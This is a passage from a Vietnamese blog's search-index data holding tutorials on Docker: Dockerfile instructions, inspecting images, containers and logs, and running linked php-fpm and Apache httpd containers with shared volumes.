trên cùng của Dockerfile\nCú pháp: 1 2 3 FROM \u0026lt;image\u0026gt; [AS \u0026lt;name\u0026gt;] FROM \u0026lt;image\u0026gt;[:\u0026lt;tag\u0026gt;] [AS \u0026lt;name\u0026gt;] FROM \u0026lt;image\u0026gt;[@\u0026lt;digest\u0026gt;] [AS \u0026lt;name\u0026gt;] Ví dụ:\n1 2 3 FROM ubuntu hoặc FROM ubuntu:latest LABEL\nChỉ thị LABEL được dùng để thêm các thông tin meta vào Docker Image khi chúng được build. Chúng tồn tại dưới dạng cặp key-value, lưu dưới dạng chuỗi. Có thể chỉ định nhiều label cho một Docker Image, mỗi cặp key-value là duy nhất.\nNếu cùng 1 key mà có nhiều value thì value gần nhất sẽ đè những value trước đó. Cú pháp:\n1 LABEL \u0026lt;key1\u0026gt;\u0026lt;value1\u0026gt; \u0026lt;key2\u0026gt;\u0026lt;value2\u0026gt; ... \u0026lt;key_n\u0026gt;\u0026lt;value_n\u0026gt; Có thể khai báo metadata cho Image theo từng dòng chỉ thị hoặc có thể tách ra khai báo thành từng dòng riêng biệt.\nĐể xem thông tin meta của một image, ta dùng lệnh docker inspect\n1 docker inspect \u0026lt;image id\u0026gt; MAINTAINER\nDùng để khai báo thông tin tác giả của dockerfile\nCú pháp: 1 MAINTAINER \u0026lt;name\u0026gt; [\u0026lt;email\u0026gt;] Ví dụ:\n1 MAINTAINER \u0026lt;edisc\u0026gt; [\u0026lt;edisc.ctf@gmail.com\u0026gt;] RUN\nDùng để chạy một lệnh nào đó trong quá trình build image, thường là các câu lệnh Linux. Tùy vào image gốc được khai báo trong FROM thì sẽ có các câu lệnh tương ứng.\nCú pháp: 1 2 RUN \u0026lt;command\u0026gt; RUN [\u0026#34;executable\u0026#34;, \u0026#34;param1\u0026#34;, \u0026#34;param2\u0026#34;] Ví dụ\n1 2 RUN apt-get update -y RUN [\u0026#34;/bin/bash\u0026#34;, \u0026#34;-c\u0026#34;, \u0026#34;echo Run\u0026#34;] Ở shell form, có thể thực hiện nhiều câu lệnh bằng dấu \\:\n1 2 3 4 FROM ubuntu:latest RUN apt-get update -y \\ apt-get install vim -y apt-get install curl -y ADD\nThực hiện sao chép các tệp, thư mục từ máy đang build hoặc remote file từ src và thêm chúng vào filesystem của image dest\nCú pháp: 1 2 ADD [--chown=\u0026lt;user\u0026gt;:\u0026lt;group\u0026gt;] \u0026lt;src\u0026gt;... \u0026lt;dest\u0026gt; ADD [--chown=\u0026lt;user\u0026gt;:\u0026lt;group\u0026gt;] [\u0026#34;\u0026lt;src\u0026gt;\u0026#34;, ... \u0026#34;\u0026lt;dest\u0026gt;\u0026#34;] trong đó:\nsrc có thể là một hoặc nhiều file, thư mục dest là địa chỉ tuyệt đối hoặc được chỉ định bởi WORKDIR Ví dụ:\n1 ADD --chown=user:mygroup file* /somedir/ COPY\nGiống như ADD là copy file từ thư mục src đến dest, khác ở việc COPY không hỗ trợ copy các remote file URLs từ các nguồn trên mạng.\nCú pháp: 1 2 COPY [--chown=\u0026lt;user\u0026gt;:\u0026lt;group\u0026gt;] \u0026lt;src\u0026gt;... \u0026lt;dest\u0026gt; COPY [--chown=\u0026lt;user\u0026gt;:\u0026lt;group\u0026gt;] [\u0026#34;\u0026lt;src\u0026gt;\u0026#34;,... \u0026#34;\u0026lt;dest\u0026gt;\u0026#34;] ENV\nDùng để khai báo các biến môi trường. Các biến được khai báo dưới dạng key-value bằng các chuỗi. Chúng sẽ được sử dụng trong các chỉ thị tiếp theo của Dockerfile.\nCú pháp: 1 ENV \u0026lt;key\u0026gt;=\u0026lt;value\u0026gt; Ví dụ:\n1 2 ENV PORT=80 ENV USERNAME=\u0026#34;user\u0026#34; PASSWORD=\u0026#34;password\u0026#34; Các biến môi trường có thể thay đổi với lệnh docker run\n1 docker run --env \u0026lt;key\u0026gt;=\u0026lt;value\u0026gt; Các command được sử dụng ENV:\n1 2 3 4 5 6 7 8 9 10 ADD COPY ENV EXPOSE FROM LABEL STOPSIGNAL USER VOLUME WORKDIR CMD\nDùng để định nghĩa các câu lệnh được chạy sau khi container được khởi động từ image vừa build.\nCú pháp: 1 2 3 CMD [\u0026#34;executable\u0026#34;, \u0026#34;param1\u0026#34;, \u0026#34;param2\u0026#34;] CMD [\u0026#34;param1\u0026#34;, \u0026#34;param2\u0026#34;] CMD command param1 param2 Ví dụ:\n1 2 FROM ubuntu:latest CMD cat password.txt USER\nThiết lập username hoặc UID để sử dụng khi chạy image và khi chạy các lệnh có trong RUN, CMD, ENTRYPOINT sau đó.\nCú pháp: 1 2 3 USER \u0026lt;user\u0026gt;[:\u0026lt;group\u0026gt;] hoặc USER \u0026lt;UID\u0026gt;[:\u0026lt;GID\u0026gt;] Ví dụ:\n1 2 3 FROM alpine:3.4 RUN useradd -G /bin/bash edisc USER edisc Build Docker Image Ta dùng lệnh docker build để tiến hành build docker image từ Dockerfile vừa tạo.\nCú pháp:\n1 docker build -t \u0026lt;image_name\u0026gt; \u0026lt;build directory\u0026gt; Ví dụ:\n1 docker build -t myimage:v1 . -t ở đây cho phép chỉ định tên image và tag của nó.\nRUN Sau khi đã tạo thành image, ta chỉ cần run nó với lệnh docker run để tiến hành chạy container.\nTổng kết Phần này chúng ta đi qua 2 nhánh chính là What is the container và Container images, ở đó chủ yếu là những kiến thức chúng ta đã thảo luận qua.\nNgoài ra, chúng ta đã đi qua một vài nhánh nhỏ của Docker Foundation. Vì phần này liên quan đến mục đích công việc của tôi, nên tôi sẽ học kĩ cũng như tìm hiểu kĩ phần này. Bài tiếp theo chúng ta sẽ cùng đi qua những nhánh kế tiếp.\n","description":"Ôn lại docker và chuyển nội dung học","id":10,"section":"posts","tags":["Docker"],"title":"Tìm hiểu và sử dụng docker (P6)","uri":"https://minhlongmt183.github.io/posts/docker_p6/"},{"content":"\rToàn bộ series này được tham khảo từ hai nguồn chính: XuanThuLabChanel và DockerDoc. Em xin chân thành cảm ơn sự cống hiến của các tác giả của những kênh nói trên.❤️❤️❤️\rTra cứu thông tin Image, Container và giám sát hoạt động container Docker Các thành phần tạo nên Container Chúng ta đã thảo luận về các khái niệm căn bản của docker ở bải trước, sau đây là những khái niệm trên dưới góc nhìn của tác giả.\nContainer: là một hộp kín để ứng dụng hoạt động. Mỗi container được tạo dựa trên một image. Khi chạy một container xuất phát từ một image, có một lớp (layer) được phép ghi thêm vào trên đỉnh của image. Do đó có thể xem: container = images + layer cho phép ghi. Và khi muốn lưu container này lại thành image mới, ta dùng lệnh docker commit. Image: như một ảnh chụp lại các cấu hình của container. Một image ở trạng thái chỉ đọc, mọi thứ thay đổi chỉ được thay đổi ở tầng trên cùng (được phép ghi) của container. Khi dùng lệnh docker commit, tầng này sẽ trở thành trạng thái chỉ đọc. Do đó, có thể thấy mỗi image đều phụ thuộc vào một hoặc nhiều image cha. platform Image: Nó là image, nhưng nó không có image cha, giống như bộ khung xương của một chú khủng long. Nó chứa các biến môi trường, các tiện ích để ứng dụng ảo hóa chạy. Registry là kho chứa các image, nơi chia sẻ, tải về các image. Dockerfile là một file cấu hình với cấu trúc sinh ra image, nó giúp tự động hóa việc tạo, chạy, sử dụng các container.\nẢnh trên cho thấy, docker bắt đầu với Platform Image để chứa các biến môi trường cần thiết để chạy. Trong quá trình container thực thi sẽ tiến hành cài đặt, bổ sung cấu hình, Layered Images 1, Layered Images 2 là images của container sau khi thực hiện lệnh docker commit và nó ở trạng thái chỉ đọc. docker image history Dùng để truy vấn thông tin lịch sử các thao tác để hình thành nên một image. Cú pháp:\n1 docker image history image_name Khi chạy, ta được kết quả như sau:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 ❯ docker image history php:8.1.0alpha1-fpm-buster IMAGE CREATED CREATED BY SIZE COMMENT 65167ddfe773 3 days ago /bin/sh -c #(nop) CMD [\u0026#34;php-fpm\u0026#34;] 0B \u0026lt;missing\u0026gt; 3 days ago /bin/sh -c #(nop) EXPOSE 9000 0B \u0026lt;missing\u0026gt; 3 days ago /bin/sh -c #(nop) STOPSIGNAL SIGQUIT 0B \u0026lt;missing\u0026gt; 3 days ago /bin/sh -c set -eux; cd /usr/local/etc; if… 26.6kB \u0026lt;missing\u0026gt; 3 days ago /bin/sh -c #(nop) WORKDIR /var/www/html 0B \u0026lt;missing\u0026gt; 3 days ago /bin/sh -c #(nop) ENTRYPOINT [\u0026#34;docker-php-e… 0B \u0026lt;missing\u0026gt; 3 days ago /bin/sh -c docker-php-ext-enable sodium 17B \u0026lt;missing\u0026gt; 3 days ago /bin/sh -c #(nop) COPY multi:6dfba8f7e64bd54… 6.75kB \u0026lt;missing\u0026gt; 3 days ago /bin/sh -c set -eux; savedAptMark=\u0026#34;$(apt-m… 104MB \u0026lt;missing\u0026gt; 3 days ago /bin/sh -c #(nop) COPY file:ce57c04b70896f77… 587B \u0026lt;missing\u0026gt; 3 days ago /bin/sh -c set -eux; savedAptMark=\u0026#34;$(apt-m… 12.5MB \u0026lt;missing\u0026gt; 3 days ago /bin/sh -c #(nop) ENV PHP_SHA256=131a81ef9e… 0B \u0026lt;missing\u0026gt; 3 days ago /bin/sh -c #(nop) ENV PHP_URL=https://downl… 0B \u0026lt;missing\u0026gt; 3 days ago /bin/sh -c #(nop) ENV PHP_VERSION=8.1.0alph… 0B \u0026lt;missing\u0026gt; 3 days ago /bin/sh -c #(nop) ENV GPG_KEYS=528995BFEDFB… 0B \u0026lt;missing\u0026gt; 4 weeks ago /bin/sh -c #(nop) ENV PHP_LDFLAGS=-Wl,-O1 -… 0B \u0026lt;missing\u0026gt; 4 weeks ago /bin/sh -c #(nop) ENV PHP_CPPFLAGS=-fstack-… 0B \u0026lt;missing\u0026gt; 4 weeks ago /bin/sh -c #(nop) ENV PHP_CFLAGS=-fstack-pr… 0B \u0026lt;missing\u0026gt; 4 weeks ago /bin/sh -c #(nop) ENV PHP_EXTRA_CONFIGURE_A… 0B \u0026lt;missing\u0026gt; 4 weeks ago /bin/sh -c set -eux; mkdir -p \u0026#34;$PHP_INI_DIR… 0B \u0026lt;missing\u0026gt; 4 weeks ago /bin/sh -c #(nop) ENV PHP_INI_DIR=/usr/loca… 0B \u0026lt;missing\u0026gt; 4 weeks ago /bin/sh -c set -eux; apt-get update; apt-g… 227MB \u0026lt;missing\u0026gt; 4 weeks ago /bin/sh -c #(nop) ENV PHPIZE_DEPS=autoconf … 0B \u0026lt;missing\u0026gt; 4 weeks ago /bin/sh -c set -eux; { echo \u0026#39;Package: php… 46B \u0026lt;missing\u0026gt; 4 weeks ago /bin/sh -c #(nop) CMD [\u0026#34;bash\u0026#34;] 0B \u0026lt;missing\u0026gt; 4 weeks ago /bin/sh -c #(nop) ADD file:7362e0e50f30ff454… 69.3MB Qua dữ kiện trên ta biết từ thao tác cơ sở đã trải qua những bước nào để có thể tạo thành image php\ndocker inspect Lệnh này trả về thông tin của image dưới dạng JSON\n1 docker inspect image_name/id Lệnh này liệt kê tất cả các thông tin về image, ví dụ sau đây là một phần thông tin về các lớp layer của image php\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 \u0026#34;RootFS\u0026#34;: { \u0026#34;Type\u0026#34;: \u0026#34;layers\u0026#34;, \u0026#34;Layers\u0026#34;: [ \u0026#34;sha256:02c055ef67f5904019f43a41ea5f099996d8e7633749b6e606c400526b2c4b33\u0026#34;, \u0026#34;sha256:d2252dfd3726823303a8f54483e10f3ed7959f33ba63ea3a19bd0fc46587bc8f\u0026#34;, \u0026#34;sha256:6c63b3f282cb455ac2e456fb99cdceab42a876603b54cc97087c17b9999b780b\u0026#34;, \u0026#34;sha256:8e859e616115511355eadb05cbdcf86333434621f77c3ac80c410257ea39f115\u0026#34;, \u0026#34;sha256:363c2d4617a0df71a4d53f484a522caa9f2f02ba1271c7f7b4ceb524c5bac61a\u0026#34;, \u0026#34;sha256:c66c7f1f8019ed243ea38cb9ca384135cfeb3cda372de18deece786702c0c582\u0026#34;, \u0026#34;sha256:d87b1d289a070d7d2503bfedb8263ff5431423cd9eca8e577ce93d2e74392315\u0026#34;, \u0026#34;sha256:7d973749b6e2ff44d90f4df11576a27388c317f99400b746e8d8c021a747c91f\u0026#34;, \u0026#34;sha256:d5677f1776e8f36c5ba0cd40ff850a2e1ce919e22019bb76529ce6102c7b89ab\u0026#34;, \u0026#34;sha256:1cce6b181873aeb25ca52478d8f6c6b1c66213689085cc7a89e229ea045abd24\u0026#34; ] }, Bên cạnh đó, lệnh này còn có thể tra cứu thông tin chi tiết của container, chúng ta chỉ cần thay tên/id của image thành tên/id của container để tra cứu thông tin chi tiết của container.\ndocker diff Như đã nói ở trên, một container được sinh ra từ một platform image, sau khi docker chạy, cài đặt, chỉnh sửa, thay đổi cấu trúc bên trong rồi commit lại thành những layer. Để xem những thay đổi của cấu trúc thư mục bên trong từ thời điểm tạo ra đến thời điểm hiện tại, ta dùng lệnh docker diff. Cú pháp:\n1 docker diff container_id/name Ví dụ, ta kiểm tra từ lúc tạo ra cho đến thời điểm hiện tại, cấu trúc thư mục bên trong container c-php đã thay đổi như thế nào:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 ❯ docker diff c-php C /home A /home/SharedData C /usr C /usr/local C /usr/local/lib C /usr/local/lib/php C /usr/local/lib/php/extensions C /usr/local/lib/php/extensions/no-debug-non-zts-20201009 A /usr/local/lib/php/extensions/no-debug-non-zts-20201009/mysqli.so A /usr/local/lib/php/extensions/no-debug-non-zts-20201009/pdo_mysql.so C /usr/local/etc C /usr/local/etc/php C /usr/local/etc/php/conf.d A /usr/local/etc/php/conf.d/docker-php-ext-mysqli.ini A /usr/local/etc/php/conf.d/docker-php-ext-pdo_mysql.ini C /usr/local/include C /usr/local/include/php C /usr/local/include/php/ext A /usr/local/include/php/ext/mysqli A /usr/local/include/php/ext/mysqli/php_mysqli_structs.h A /usr/local/include/php/ext/mysqli/mysqli_mysqlnd.h ở đây kí tư C thể hiện rằng thư mục đó đã được cập nhật, còn A là thư mục đó vừa được thêm vào.\ndocker log Khi container hoạt động, dấu vết hoạt động của nó được ghi vào hệ thống log của container. Để kiểm tra log của container, chúng ta dùng lệnh:\n1 docker logs container_name/id Ví dụ ta kiểm tra log của c-php xem trong quá trình hoạt động nó đã ghi những gì:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 ❯ docker logs c-php [11-Jun-2021 07:15:23] NOTICE: fpm is running, pid 1 [11-Jun-2021 07:15:23] NOTICE: ready to handle connections 172.23.0.4 - 11/Jun/2021:07:16:07 +0000 \u0026#34;POST /wp-admin/setup-config.php\u0026#34; 500 [11-Jun-2021 07:17:34] NOTICE: Finishing ... [11-Jun-2021 07:17:34] NOTICE: exiting, bye-bye! [11-Jun-2021 07:17:35] NOTICE: fpm is running, pid 1 [11-Jun-2021 07:17:35] NOTICE: ready to handle connections 172.23.0.4 - 11/Jun/2021:07:17:42 +0000 \u0026#34;POST /wp-admin/setup-config.php\u0026#34; 500 172.23.0.4 - 11/Jun/2021:07:17:48 +0000 \u0026#34;POST /wp-admin/setup-config.php\u0026#34; 500 172.23.0.4 - 11/Jun/2021:07:17:53 +0000 \u0026#34;GET /index.php\u0026#34; 302 172.23.0.4 - 11/Jun/2021:07:17:53 +0000 \u0026#34;GET /wp-admin/setup-config.php\u0026#34; 200 172.23.0.4 - 11/Jun/2021:07:17:58 +0000 \u0026#34;GET /wp-admin/setup-config.php\u0026#34; 200 172.23.0.4 - 11/Jun/2021:07:18:19 +0000 \u0026#34;POST /wp-admin/setup-config.php\u0026#34; 500 172.23.0.4 - 11/Jun/2021:07:22:34 +0000 \u0026#34;POST /wp-admin/setup-config.php\u0026#34; 500 172.23.0.4 - 11/Jun/2021:07:22:43 +0000 \u0026#34;GET /index.php\u0026#34; 302 172.23.0.4 - 11/Jun/2021:07:22:43 +0000 \u0026#34;GET /wp-admin/setup-config.php\u0026#34; 200 172.23.0.4 - 11/Jun/2021:07:23:32 +0000 \u0026#34;GET /wp-admin/setup-config.php\u0026#34; 200 172.23.0.4 - 11/Jun/2021:07:24:31 +0000 \u0026#34;POST /wp-admin/setup-config.php\u0026#34; 500 172.23.0.4 - 11/Jun/2021:07:26:46 +0000 \u0026#34;POST /wp-admin/setup-config.php\u0026#34; 500 172.23.0.4 - 11/Jun/2021:07:36:12 +0000 \u0026#34;POST /wp-admin/setup-config.php\u0026#34; 500 172.23.0.4 - 11/Jun/2021:10:39:55 +0000 \u0026#34;GET /index.php\u0026#34; 302 172.23.0.4 - 11/Jun/2021:10:39:55 +0000 \u0026#34;GET /wp-admin/setup-config.php\u0026#34; 200 172.23.0.4 - 11/Jun/2021:10:39:59 +0000 \u0026#34;GET /wp-admin/setup-config.php\u0026#34; 200 172.23.0.4 - 11/Jun/2021:10:40:43 +0000 \u0026#34;POST /wp-admin/setup-config.php\u0026#34; 500 172.23.0.4 - 11/Jun/2021:11:16:52 +0000 \u0026#34;POST /wp-admin/setup-config.php\u0026#34; 500 [11-Jun-2021 11:19:58] NOTICE: Finishing ... [11-Jun-2021 11:19:58] NOTICE: exiting, bye-bye! [11-Jun-2021 11:20:00] NOTICE: fpm is running, pid 1 [11-Jun-2021 11:20:00] NOTICE: ready to handle connections 172.23.0.4 - 11/Jun/2021:11:20:05 +0000 \u0026#34;POST /wp-admin/setup-config.php\u0026#34; 500 172.23.0.4 - 11/Jun/2021:11:20:09 +0000 \u0026#34;GET /index.php\u0026#34; 302 172.23.0.4 - 11/Jun/2021:11:20:09 +0000 \u0026#34;GET /wp-admin/setup-config.php\u0026#34; 200 172.23.0.4 - 11/Jun/2021:11:22:19 +0000 \u0026#34;GET /wp-admin/setup-config.php\u0026#34; 200 172.23.0.4 - 11/Jun/2021:11:22:43 +0000 \u0026#34;POST /wp-admin/setup-config.php\u0026#34; 500 [11-Jun-2021 11:27:42] NOTICE: Finishing ... [11-Jun-2021 11:27:42] NOTICE: exiting, bye-bye! [14-Jun-2021 02:55:15] NOTICE: fpm is running, pid 1 [14-Jun-2021 02:55:15] NOTICE: ready to handle connections Trường hợp log quá dài, ta có thể chỉ định số dòng kiểm tra bằng cách thêm option --tail so_dong\n1 2 3 4 5 6 7 8 9 10 11 ❯ docker logs --tail 10 c-php [11-Jun-2021 11:20:00] NOTICE: ready to handle connections 172.23.0.4 - 11/Jun/2021:11:20:05 +0000 \u0026#34;POST /wp-admin/setup-config.php\u0026#34; 500 172.23.0.4 - 11/Jun/2021:11:20:09 +0000 \u0026#34;GET /index.php\u0026#34; 302 172.23.0.4 - 11/Jun/2021:11:20:09 +0000 \u0026#34;GET /wp-admin/setup-config.php\u0026#34; 200 172.23.0.4 - 11/Jun/2021:11:22:19 +0000 \u0026#34;GET /wp-admin/setup-config.php\u0026#34; 200 172.23.0.4 - 11/Jun/2021:11:22:43 +0000 \u0026#34;POST /wp-admin/setup-config.php\u0026#34; 500 [11-Jun-2021 11:27:42] NOTICE: Finishing ... [11-Jun-2021 11:27:42] NOTICE: exiting, bye-bye! [14-Jun-2021 02:55:15] NOTICE: fpm is running, pid 1 [14-Jun-2021 02:55:15] NOTICE: ready to handle connections Để kiểm tra log theo thời gian thực khi docker đang chạy, ta thêm tùy chọn -f vào:\n1 docker logs -f container_name/id docker stats Khi container đang chạy, nó có sử dụng các tài nguyên của hệ thống, để giám sát mức độ sử dụng tài nguyên, ta sử dụng cú pháp:\n1 docker stats container_name/id khi dùng\n1 docker stats mặc định, nó sẽ giám sát toàn bộ container đang chạy trên hệ thống\nProcess docker top 1 docker top docker_name/id Dùng để xem thông tin về tiến trình (process) của docker, bao gồm PID (process Id) và PPID (Parent Process Id).\nChúng ta còn có thể xem thông tin về các tiến trình ở dạng cây:\n1 pstree -c -p -A $(pgrep dockerd) ","description":"Tra cứu thông tin Image, Container và giám sát hoạt động container Docker","id":11,"section":"posts","tags":["Docker"],"title":"Tìm hiểu và sử dụng docker (P5)","uri":"https://minhlongmt183.github.io/posts/docker_p5/"},{"content":"\rToàn bộ series này được tham khảo từ hai nguồn chính: XuanThuLabChanel và DockerDoc. Em xin chân thành cảm ơn sự cống hiến của các tác giả của những kênh nói trên.❤️❤️❤️\rCài đặt, tạo và chạy PHP, phiên bản có PHP-FPM bằng Docker pull phiên bản image php-fpm từ docker hub Chúng ta tải bản 7.3-fpm từ docker hub. fpm ở đây có nghĩa là trong gói này, có thêm dịch vụ php-fpm. Dịch vụ này lắng nghe và tạo ra nhiều tiến trình php trên cổng 9000 chờ các webserver như http, nginx kết nối vào.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 ❯ docker pull php:7.3-fpm 7.3-fpm: Pulling from library/php 69692152171a: Pull complete 2040822db325: Pull complete 9b4ca5ae9dfa: Pull complete ac1fe7c6d966: Pull complete c342d9e76a3c: Pull complete 6ead8e46ae7b: Pull complete 5c98df0d7626: Pull complete dd302d19deb7: Pull complete 7701b71427d2: Pull complete 672353cf3439: Pull complete b379e47d0c20: Pull complete Digest: sha256:d38892103d2f76e3245a080875718d74414d6d7a57cfe7000a91f4aa668f870b Status: Downloaded newer image for php:7.3-fpm ❯ docker images REPOSITORY TAG IMAGE ID CREATED SIZE newimage version2 a8e04dcf8737 2 days ago 170MB busybox latest 69593048aa3a 2 days ago 1.24MB php 7.3-fpm 2692864592ed 4 weeks ago 399MB ubuntu latest 7e0aa2d69a15 6 weeks ago 72.7MB centos latest 300e315adb2f 6 months ago 209MB Tạo mạng bridge Đầu tiên chúng ta tạo một bride network có tên là www-net\n1 2 3 4 5 6 7 8 ❯ docker network create --driver bridge www-net 4d9c8d81da85fd9118cea666265aab88ae6ab71ac1d53a2dd81b168d87c9d290 ❯ docker network ls NETWORK ID NAME DRIVER SCOPE 286d5161c9f6 bridge bridge local 0f2ab02aa9f4 host host local 271997adaaa9 none null local 4d9c8d81da85 www-net bridge local Tạo thư mục chia sẻ dữ liệu giữa máy host và container Trên máy host, ta xây dựng một cây thư mục để lưu trữ dữ liệu chia sẻ với container như sau:\n1 2 3 4 5 6 7 . ├── docker │ └── data │ ├── c1.txt │ ├── data_container2.txt │ ├── d.txt │ └── www Về kiến thức liên quan về chia sẻ dữ liệu giữa máy host và container, bạn có thể xem kĩ hơn ở phần 2\nChạy container php-fpm Chúng ta tạo một container có tên là c-php\n1 2 3 4 5 ❯ docker run -d --name c-php -v /home/edisc/Desktop/docker/data:/home/SharedData --network www-net php:7.3-fpm 2894c033c93f5e4f2b02198afbb94cc9b5e62467b2e4c1291a7c2444f30659a7 ❯ docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 2894c033c93f php:7.3-fpm \u0026#34;docker-php-entrypoi…\u0026#34; 2 minutes ago Up 2 minutes 9000/tcp c-php Ở đây, vì sau khi tạo chúng ta không muốn vào trực tiệp docker nên không dùng tùy chọn -it, tuy nhiên thêm lệnh -d để sau khi tạo docker tiếp tục chạy nền. Ỏ đây, tôi dùng linux nên quá trình diễn ra khá thuận lợi, nhưng theo tác giả thì nếu bạn dùng Windows hay MacOs thì cần phải thiết lập thư mục ở chế độ share với docker thì mới có thể tạo được. Chi tiết bạn có thể vào kênh của anh XuanThuLabChanel để xem rõ hơn. Bên cạnh đó, ta cũng thấy container mới được tạo này chạy đang chạy lệnh \u0026ldquo;docker-php-entrypoi…\u0026rdquo;, bản chất lệnh này dùng để gọi dịch vụ php-fpm để chạy và lắng nghe ở cổng 9000.\nKiểm tra php Chúng ta vào container vừa mới tạo, ôn lại kiến thức cũ, thay vì vào container bằng lệnh docker attach ta còn có một cách khác đó là thực thi câu lệnh bash trong container từ host thông qua docker exec\n1 2 ❯ docker exec -it c-php bash root@2894c033c93f:/var/www/html# Ta vào thư mục chia sẻ /home/SharedData/ để kiểm tra dữ liệu trên thư mục\n1 2 3 4 root@2894c033c93f:/var/www/html# cd /home/SharedData/ root@2894c033c93f:/home/SharedData# ls c1.txt\td.txt data_container2.txt www root@2894c033c93f:/home/SharedData# Trên máy host, ta tạo file test.php trong thư mục www và dễ thấy nó cũng hiện ở trong container.\nTiến hành chạy lệnh file test.php:\nTa đã chạy được php, php trên container là phiên bản PHP 7.3.28\n1 2 3 4 root@2894c033c93f:/home/SharedData/www# php --version PHP 7.3.28 (cli) (built: May 12 2021 13:46:47) ( NTS ) Copyright (c) 1997-2018 The PHP Group Zend Engine v3.3.28, Copyright (c) 1998-2018 Zend Technologies Cài đặt, chạy Apache HTTPD bằng Docker Tải image Apache httpd Chúng ta đã cài conatiner c-php, tiếp theo cài máy chủ httpd. Chúng ta tải image httpd phiên bản mới nhất về với câu lệnh quen thuộc:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 ❯ docker pull httpd Using default tag: latest latest: Pulling from library/httpd 69692152171a: Already exists 7284b4e0cc7b: Pull complete 3678b2d55ccd: Pull complete aeb67982a725: Pull complete 06954f8169fd: Pull complete Digest: sha256:48bae0ac5d0d75168f1c1282c0eb21b43302cb1b5c5dc9fa3b4a758ccfb36fe9 Status: Downloaded newer image for httpd:latest ❯ docker images REPOSITORY TAG IMAGE ID CREATED SIZE newimage version2 a8e04dcf8737 2 days ago 170MB busybox latest 69593048aa3a 2 days ago 1.24MB httpd latest 39c2d1c93266 2 weeks ago 138MB php 7.3-fpm 2692864592ed 4 weeks ago 399MB ubuntu latest 7e0aa2d69a15 6 weeks ago 72.7MB centos latest 300e315adb2f 6 months ago 209MB Lấy cấu hình httpd.conf Khi htppd chạy, nó sẽ nạp file cấu hình trong đường dẫn ở container: /usr/local/apache2/conf/httpd.conf. Do đó, đây cũng là nơi để chúng ta muốn cấu hình tùy chỉnh theo ý muốn của mình.\nĐầu tiên, ta sẽ chạy tạm thời container httpd để trích xuất file cấu hình httpd.conf ra máy host trước.\n1 ❯ docker run --rm -v /home/edisc/Desktop/docker/data:/home/SharedData httpd cp /usr/local/apache2/conf/httpd.conf /home/SharedData/ Vì chúng ta chạy container này một lần để trích xuất file httpd.conf nên ta thêm tùy chọn --rm để docker sẽ tự động xóa sau khi chạy, bên cạnh đó, khi chạy container ta cũng thực hiện luôn câu lệnh copy file httpd.conf đến thư mục chia sẻ dữ liệu của mình. Sau khi chạy lệnh trên, chúng ta đã có file httpd.conf trên thư mục data ở host.\n1 2 ❯ ls c1.txt data_container2.txt d.txt httpd.conf www Cấu hình httpd.conf Sau khi có được file httpd.conf, ta mở ra và tiến hành cấu hình.\nMáy chủ apache được tạo ra sẽ tạo những file php thông qua proxy, tức là khi ta truy vấn đến những file có phần mở rộng là .php apache sẽ yêu cầu server chạy php-fpm để thi hành file php đó. Để sử dụng proxy cho apache, ta cần phải nạp các module về proxy cụ thể :\nBật một số module sau trong file httpd.conf: module mod_proxy.so và mod_proxy_fcgi.so\nThêm AddHandler Thêm AddHandler để chỉ thị apache chạy php thông qua proxy. Ta thêm dòng lệnh sau vào cuối file:\n1 AddHandler \u0026#34;proxy:fcgi://ip:9000\u0026#34; .php trường hợp này, ta truy vấn để container c-php nên ở ip ta thay thành c-php và cổng vẫn là 9000\nThiết lập thư mục mặc định của apache Để thiết lập thư mục mặc định khi chúng ta share, chúng ta sẽ thay đổi ở\n1 2 DocumentRoot \u0026#34;/usr/local/apache2/htdocs\u0026#34; \u0026lt;Directory \u0026#34;/usr/local/apache2/htdocs\u0026#34;\u0026gt; Thay đổi thành thư mục mà chúng ta muốn mount vào.\nChạy máy chủ Http Apache Ta chạy câu lệnh:\n1 docker run --network www-net --name c-httpd -h httpd -p 9999:80 -p 443:443 -v /home/edisc/Desktop/docker/data:/home/SharedData -v /home/edisc/Desktop/docker/data/httpd.conf:/usr/local/apache2/conf/httpd.conf httpd Ở đây:\nTa chạy một container có tên là c-httpd với hostname là httpd kết nối mạng www-net. Ánh xạ cổng 80, 443 của container lần lượt lên cổng 9999, 443 của máy host. Thư mục chia sẻ dữ liệu /home/edisc/Desktop/docker/data trên máy host được ánh xạ lên /home/SharedData trên container, và file cấu hình httpd.conf cũng được ánh xạ vào /usr/local/apache2/conf/httpd.conf.\nỞ đây lưu ý, khả năng chúng ta sẽ bị lỗi 1 2 docker: Error response from daemon: driver failed programming external connectivity on endpoint c-httpd (e0fa76873fc8a5b1b73a0e9589774a25d7a7c377a777d3af6c5313bf7c44adc7): Error starting userland proxy: listen tcp 0.0.0.0:443: bind: address already in use. ERRO[0000] error waiting for container: context canceled Tức là cổng mà chúng ta ánh xạ trên máy host đã được sử dụng bởi một tiến trình nào đó. Lúc bây giờ có 2 cách giải quyết:\nChọn cổng khác trên máy host Tìm các ứng dụng sử dụng cổng này rồi kill nó đi. Để tìm các cổng sử dụng ta dùng lệnh sudo netstat -pna | grep 443 với 443 là port mình cần tìm.\nTa được kết quả. 1 2 3 4 5 6 7 ❯ docker run --network www-net --name c-httpd -h httpd -p 9999:80 -p 443:443 -v /home/edisc/Desktop/docker/data:/home/SharedData -v /home/edisc/Desktop/docker/data/httpd.conf:/usr/local/apache2/conf/httpd.conf httpd [Thu Jun 10 08:10:54.751670 2021] [proxy_html:notice] [pid 1:tid 139955972379776] AH01425: I18n support in mod_proxy_html requires mod_xml2enc. Without it, non-ASCII characters in proxied pages are likely to display incorrectly. AH00558: httpd: Could not reliably determine the server\u0026#39;s fully qualified domain name, using 172.23.0.2. Set the \u0026#39;ServerName\u0026#39; directive globally to suppress this message [Thu Jun 10 08:10:54.767249 2021] [proxy_html:notice] [pid 1:tid 139955972379776] AH01425: I18n support in mod_proxy_html requires mod_xml2enc. Without it, non-ASCII characters in proxied pages are likely to display incorrectly. AH00558: httpd: Could not reliably determine the server\u0026#39;s fully qualified domain name, using 172.23.0.2. Set the 